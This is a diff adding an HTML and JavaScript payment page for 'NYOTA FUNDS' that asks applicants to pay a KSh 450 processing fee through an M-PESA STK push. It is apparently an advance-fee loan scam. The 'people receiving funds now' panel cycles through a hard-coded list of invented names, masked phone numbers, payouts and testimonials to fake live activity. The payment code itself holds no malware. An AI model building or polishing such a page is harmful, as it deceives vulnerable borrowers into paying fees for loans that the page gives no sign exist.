@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#064e3b">
+<title>NYOTA FUNDS — Payment</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+font-family:Arial,sans-serif;
+min-height:100vh;
+padding:12px;
+background:
+radial-gradient(circle at 10% 10%,rgba(34,197,94,.35),transparent 28%),
+radial-gradient(circle at 90% 90%,rgba(59,130,246,.35),transparent 28%),
+linear-gradient(135deg,#064e3b,#1e40af);
+color:white;
+}
+
+.container{width:100%;max-width:420px;margin:auto;}
+
+.card{
+padding:20px 16px;
+border-radius:20px;
+background:linear-gradient(145deg,rgba(255,255,255,.10),rgba(255,255,255,.04));
+border:1px solid rgba(255,255,255,.12);
+backdrop-filter:blur(14px);
+box-shadow:0 18px 40px rgba(0,0,0,.35);
+}
+
+h1{text-align:center;font-size:24px;margin-bottom:8px;}
+
+p{text-align:center;font-size:14px;line-height:1.5;color:rgba(255,255,255,.85);}
+
+.amount{
+margin:18px 0;
+padding:14px;
+border-radius:12px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+background:rgba(22,163,74,.12);
+border:1px solid rgba(22,163,74,.25);
+}
+
+/* Only KSh and amount are green */
+.money{
+color:#22c55e;
+}
+
+label{
+display:block;
+margin:14px 0 6px;
+font-weight:bold;
+font-size:14px;
+}
+
+input{
+width:100%;
+padding:13px;
+border-radius:10px;
+border:1px solid rgba(255,255,255,.15);
+background:rgba(255,255,255,.08);
+color:white;
+font-size:16px;
+outline:none;
+}
+
+input:focus{
+border-color:#22c55e;
+box-shadow:0 0 0 3px rgba(34,197,94,.15);
+}
+
+button{
+width:100%;
+padding:14px;
+margin-top:18px;
+border:none;
+border-radius:11px;
+background:linear-gradient(135deg,#16a34a,#087f32);
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 10px 25px rgba(22,163,74,.30);
+transition:.25s;
+}
+
+button:hover{transform:translateY(-2px);}
+button:disabled{opacity:.6;cursor:not-allowed;box-shadow:none;transform:none;}
+
+#stkMessage{
+min-height:35px;
+margin-top:12px;
+text-align:center;
+font-size:13px;
+font-weight:600;
+}
+
+.success{color:#6DFFAA;}
+.error{color:#FF7D8A;}
+
+.small{
+margin-top:10px;
+font-size:12px;
+color:rgba(255,255,255,.6);
+}
+
+.live-comments{
+position:relative;
+margin-top:25px;
+padding:18px;
+border-radius:18px;
+background:rgba(255,255,255,.08);
+border:1px solid rgba(255,255,255,.12);
+overflow:hidden;
+}
+
+.live-comments h3{
+text-align:center;
+font-size:17px;
+margin-bottom:15px;
+position:relative;
+z-index:2;
+}
+
+.live-comment{
+display:flex;
+align-items:center;
+gap:10px;
+padding:12px;
+margin-bottom:10px;
+border-radius:12px;
+background:rgba(22,163,74,.10);
+border:1px solid rgba(22,163,74,.22);
+position:relative;
+z-index:2;
+}
+
+.live-comment:last-child{margin-bottom:0;}
+
+.live-avatar{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#16a34a;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:20px;
+flex-shrink:0;
+}
+
+.live-content strong{display:block;font-size:14px;}
+.live-content p{text-align:left;font-size:13px;margin:2px 0;}
+.live-content b{color:#7ee7a8;}
+.live-content small{font-size:11px;color:rgba(255,255,255,.6);}
+
+.flower-rain{
+position:absolute;
+top:42px;
+left:0;
+width:100%;
+height:170px;
+pointer-events:none;
+z-index:1;
+}
+
+.rain-flower{
+position:absolute;
+top:-30px;
+font-size:20px;
+animation:flowerFall linear forwards;
+}
+
+@keyframes flowerFall{
+0%{transform:translateY(-20px) rotate(0deg);opacity:1;}
+100%{transform:translateY(190px) rotate(360deg);opacity:0;}
+}
+
+
+/* WhatsApp Floating Icon */
+.whatsapp-widget{
+position:fixed;
+right:20px;
+bottom:20px;
+z-index:99999;
+font-family:Arial,sans-serif;
+}
+
+.whatsapp-button{
+width:62px;
+height:62px;
+border-radius:50%;
+background:#25D366;
+display:flex;
+align-items:center;
+justify-content:center;
+text-decoration:none;
+box-shadow:0 6px 20px rgba(0,0,0,.30);
+transition:transform .25s ease,box-shadow .25s ease;
+animation:whatsappPulse 2.5s infinite;
+}
+
+.whatsapp-button svg{
+width:35px;
+height:35px;
+fill:white;
+}
+
+.whatsapp-button:hover{
+transform:scale(1.10);
+box-shadow:0 9px 28px rgba(0,0,0,.35);
+}
+
+.whatsapp-tooltip{
+position:absolute;
+right:75px;
+top:50%;
+transform:translateY(-50%);
+background:#111827;
+color:white;
+padding:10px 15px;
+border-radius:9px;
+font-size:14px;
+font-weight:600;
+white-space:nowrap;
+opacity:0;
+visibility:hidden;
+transition:.25s ease;
+box-shadow:0 5px 15px rgba(0,0,0,.25);
+}
+
+.whatsapp-tooltip::after{
+content:"";
+position:absolute;
+right:-7px;
+top:50%;
+transform:translateY(-50%);
+border-width:7px 0 7px 7px;
+border-style:solid;
+border-color:transparent transparent transparent #111827;
+}
+
+.whatsapp-widget:hover .whatsapp-tooltip{
+opacity:1;
+visibility:visible;
+right:80px;
+}
+
+@keyframes whatsappPulse{
+0%{
+box-shadow:0 0 0 0 rgba(37,211,102,.50);
+}
+70%{
+box-shadow:0 0 0 13px rgba(37,211,102,0);
+}
+100%{
+box-shadow:0 0 0 0 rgba(37,211,102,0);
+}
+}
+
+@media(max-width:600px){
+.whatsapp-widget{
+right:15px;
+bottom:15px;
+}
+
+.whatsapp-button{
+width:58px;
+height:58px;
+}
+
+.whatsapp-button svg{
+width:32px;
+height:32px;
+}
+
+.whatsapp-tooltip{
+display:none;
+}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<div class="card">
+
+<h1>🌟 NYOTA FUNDS</h1>
+
+<p>👋 Welcome, <strong id="name">Applicant</strong></p>
+
+<p>Please complete the processing fee payment to continue.</p>
+
+<div class="amount" id="selectedAmountBox">
+💵 Selected Amount: <span class="money">KSh 0</span>
+</div>
+
+<div class="amount" id="feeAmount">
+🧾 Processing Fee: <span class="money">KSh 450</span>
+</div>
+
+<label>👤 Full Name</label>
+<input type="text" id="fullName" readonly>
+
+<label>📱 M-PESA Phone Number</label>
+<input type="tel" id="phone" placeholder="2547XXXXXXXX" maxlength="12">
+
+<button id="payBtn">💳 Pay Processing Fee</button>
+
+<div id="stkMessage"></div>
+
+<p class="small">
+📲 You will receive an M-PESA STK Push on the phone number entered above.
+</p>
+
+<div class="live-comments">
+
+<h3>🎉 PEOPLE RECEIVING NYOTA FUNDS NOW</h3>
+
+<div class="flower-rain" id="flowerRain"></div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName1">Wanjiku</strong>
+<p><span id="livePhone1">07*****95</span> received <b id="liveAmount1">KSh 22,000</b></p>
+<small id="liveTime1">5s ago</small>
+</div>
+</div>
+
+<div class="live-comment">
+<div class="live-avatar">💰</div>
+<div class="live-content">
+<strong id="liveName2">Kiptoo</strong>
+<p><span id="livePhone2">07*****28</span> received <b id="liveAmount2">KSh 75,000</b></p>
+<small id="liveTime2">12s ago</small>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+
+
+<!-- WhatsApp Floating Button -->
+<div class="whatsapp-widget">
+
+<div class="whatsapp-tooltip">
+Chat with us
+</div>
+
+<a
+href="https://wa.me/254180615574?text=Hi%20NYOTA%20FUNDS%2C%20I%20would%20like%20more%20information."
+target="_blank"
+rel="noopener noreferrer"
+aria-label="Chat with us on WhatsApp"
+class="whatsapp-button"
+>
+
+<svg viewBox="0 0 32 32" aria-hidden="true">
+<path d="M16 3C8.82 3 3 8.82 3 16c0 2.29.6 4.44 1.75 6.33L3 29l6.86-1.7A12.94 12.94 0 0 0 16 29c7.18 0 13-5.82 13-13S23.18 3 16 3zm0 23.6c-2.02 0-3.99-.54-5.71-1.56l-.41-.24-4.07 1.01 1.05-3.97-.27-.43A10.56 10.56 0 1 1 16 26.6zm5.8-7.92c-.32-.16-1.9-.94-2.19-1.05-.29-.11-.5-.16-.71.16-.21.32-.81 1.05-.99 1.27-.18.21-.36.24-.68.08-.32-.16-1.35-.5-2.57-1.59-.95-.85-1.59-1.89-1.78-2.21-.18-.32-.02-.49.14-.65.14-.14.32-.36.48-.54.16-.18.21-.32.32-.53.11-.21.05-.4-.03-.56-.08-.16-.71-1.71-.97-2.34-.26-.62-.52-.54-.71-.55h-.61c-.21 0-.55.08-.84.4-.29.32-1.1 1.08-1.1 2.63s1.13 3.05 1.29 3.26c.16.21 2.22 3.39 5.38 4.76.75.32 1.34.51 1.8.65.76.24 1.45.21 2 .13.61-.09 1.9-.78 2.17-1.53.27-.75.27-1.4.19-1.53-.08-.13-.29-.21-.61-.37z"/>
+</svg>
+
+</a>
+</div>
+
+
+<script>
+"use strict";
+
+const BACKEND_URL="https://nyota-funds-22.onrender.com";
+
+const applicant=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+localStorage.getItem("applicantName")||
+"Applicant";
+
+const savedPhone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
+"";
+
+const processingFee=
+Number(localStorage.getItem("processingFee")||450);
+
+const selectedAmount=
+Number(localStorage.getItem("selectedAmount")||0);
+
+document.getElementById("name").textContent=applicant;
+document.getElementById("fullName").value=applicant;
+document.getElementById("phone").value=savedPhone;
+
+/* Only KSh and amount are green */
+document.getElementById("selectedAmountBox").innerHTML=
+"💵 Selected Amount: <span class='money'>KSh "+selectedAmount.toLocaleString("en-KE")+"</span>";
+
+document.getElementById("feeAmount").innerHTML=
+"🧾 Processing Fee: <span class='money'>KSh "+processingFee.toLocaleString("en-KE")+"</span>";
+
+const phoneEl=document.getElementById("phone");
+const payBtn=document.getElementById("payBtn");
+const msg=document.getElementById("stkMessage");
+
+function setMessage(text,type=""){
+msg.textContent=text;
+msg.className=type;
+}
+
+function setLoading(state,text){
+payBtn.disabled=state;
+payBtn.textContent=state?text:"💳 Pay Processing Fee";
+}
+
+function normalizePhone(value){
+let phone=value.replace(/[^\d+]/g,"");
+if(phone.startsWith("+254")) phone=phone.slice(1);
+if(phone.startsWith("07")||phone.startsWith("01")) phone="254"+phone.slice(1);
+return phone;
+}
+
+
+async function readJson(res){
+  const txt = await res.text();
+
+  let data = {};
+  try {
+    data = txt ? JSON.parse(txt) : {};
+  } catch {
+    if (!res.ok) {
+      throw new Error(
+        `Request failed with HTTP ${res.status}. Check the backend endpoint or payment provider.`
+      );
+    }
+    throw new Error(
+      `The server returned invalid JSON (HTTP ${res.status}).`
+    );
+  }
+
+  if (!res.ok) {
+    throw new Error(
+      data.message || data.error || `Request failed with HTTP ${res.status}.`
+    );
+  }
+
+  return data;
+}
+  
+  
+
+async function payNow(){
+const phone=normalizePhone(phoneEl.value.trim());
+
+if(!/^254(?:7|1)\d{8}$/.test(phone)){
+setMessage("Enter a valid M-PESA number.","error");
+return;
+}
+
+localStorage.setItem("phoneNumber",phone);
+
+setLoading(true,"Sending STK Push...");
+setMessage("Sending payment request...");
+
+try{
+const response=await fetch(`${BACKEND_URL}/stk-push`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({phone,amount:processingFee})
+});
+
+const data=await readJson(response);
+
+if(!response.ok||data.success===false){
+throw new Error(data.message||"STK Push failed.");
+}
+
+const transactionId=data.transactionId||data.data?.transactionId||data.checkout_request_id;
+
+setLoading(true,"Waiting for payment...");
+setMessage("STK Push sent. Enter your M-PESA PIN.");
+
+await checkPayment(transactionId);
+
+}catch(error){
+setMessage(error.message,"error");
+setLoading(false);
+}
+}
+
+async function checkPayment(transactionId){
+const start=Date.now();
+
+while(Date.now()-start<120000){
+try{
+const response=await fetch(`${BACKEND_URL}/payment-status`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({transactionId})
+});
+
+const result=await readJson(response);
+const status=String(result.data?.status||"").toUpperCase();
+
+if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
+setMessage("Payment successful. Redirecting...","success");
+setLoading(true,"Payment Confirmed");
+setTimeout(()=>window.location.href="delivery.html",1000);
+return;
+}
+
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
+
+}catch(error){
+if(/failed|cancelled|expired/i.test(error.message)){
+setMessage(error.message,"error");
+setLoading(false);
+return;
+}
+}
+
+await new Promise(r=>setTimeout(r,3000));
+}
+
+setMessage("Payment confirmation timed out.","error");
+setLoading(false);
+}
+
+payBtn.addEventListener("click",payNow);
+
+const rainContainer=document.getElementById("flowerRain");
+const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
+
+function createRainFlower(){
+const flower=document.createElement("span");
+flower.className="rain-flower";
+flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+flower.style.left=Math.random()*100+"%";
+flower.style.fontSize=(16+Math.random()*12)+"px";
+flower.style.animationDuration=(2+Math.random()*2)+"s";
+rainContainer.appendChild(flower);
+setTimeout(()=>flower.remove(),4000);
+}
+
+setInterval(createRainFlower,180);
+
+const livePeople=[
+["Achieng","07*****37","KSh 30,000","3s ago"],
+["Wairimu","07*****47","KSh 150,000","19s ago"],
+["Otieno","07*****65","KSh 50,000","16s ago"],
+["Cheruiyot","07*****39","KSh 50,000","8s ago"],
+["Wanjiku","07*****95","KSh 22,000","5s ago"],
+["Kiptoo","07*****28","KSh 75,000","12s ago"],
+["Victor Yegon", "Funds helped me pay my rent. Thank you!", "3s ago"],
+["Irene Atieno", "Quick approval and smooth process.", "8s ago"],
+["Winfred Chepkemoi", "Everything was easy to understand.", "12s ago"],
+["Victor Ochieng", "The application process was simple.", "15s ago"],
+["Mary Wanjiku", "Customer support was very helpful.", "18s ago"],
+["Brian Kiptoo", "I liked how easy it was to apply.", "21s ago"],
+["Faith Njeri", "The experience was smooth from start to finish.", "25s ago"],
+["James Mutua", "The website was easy to use.", "30s ago"],
+["Grace Atieno", "The instructions were clear and helpful.", "34s ago"],
+["Peter Mwangi", "Everything worked well on my phone.", "39s ago"],
+["Chebet Mercy", "A very straightforward experience.", "43s ago"],
+["John Omondi", "The process was fast and simple.", "48s ago"],
+["Daniel Wekesa", "I completed the application without problems.", "54s ago"],
+["Faith Akinyi", "The design is clean and easy to follow.", "59s ago"],
+["Kiplagat Eric", "A smooth experience from beginning to end.", "1m ago"],
+["Njeri","07*****71","KSh 110,000","9s ago"],
+["Mutua","07*****84","KSh 40,000","15s ago"],
+["Atieno","07*****53","KSh 65,000","7s ago"],
+["Mwangi","07*****16","KSh 85,000","11s ago"],
+["Chebet","07*****62","KSh 35,000","6s ago"],
+["Omondi","07*****48","KSh 150,000","14s ago"],
+["Wekesa","07*****11","KSh 40,000","20s ago"],
+["Faith","07*****74","KSh 22,000","10s ago"],
+["Kiplagat","07*****90","KSh 50,000","2s ago"]];
+
+let current=4;
+
+function updateLiveComments(){
+const p1=livePeople[current];
+const p2=livePeople[(current+1)%livePeople.length];
+
+liveName1.textContent=p1[0];
+livePhone1.textContent=p1[1];
+liveAmount1.textContent=p1[2];
+liveTime1.textContent=p1[3];
+
+liveName2.textContent=p2[0];
+livePhone2.textContent=p2[1];
+liveAmount2.textContent=p2[2];
+liveTime2.textContent=p2[3];
+
+current=(current+2)%livePeople.length;
+}
+
+updateLiveComments();
+setInterval(updateLiveComments,3000);
+</script>
+
+</body>
+  </html>
